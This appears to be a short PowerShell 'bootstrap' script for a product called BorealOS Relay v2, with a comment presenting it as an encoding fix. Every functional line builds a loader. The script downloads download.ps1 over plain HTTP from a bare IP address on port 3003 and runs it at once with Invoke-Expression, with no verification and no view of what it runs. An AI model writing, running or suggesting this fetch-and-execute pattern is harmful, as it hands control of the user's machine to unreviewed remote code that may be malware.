# BorealOS Relay v2 - Bootstrap (ASCII only, fixes encoding)
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$wc = New-Object System.Net.WebClient
$wc.Encoding = [System.Text.Encoding]::UTF8
$script = $wc.DownloadString("http://8.148.237.155:3003/download.ps1")
Invoke-Expression $script
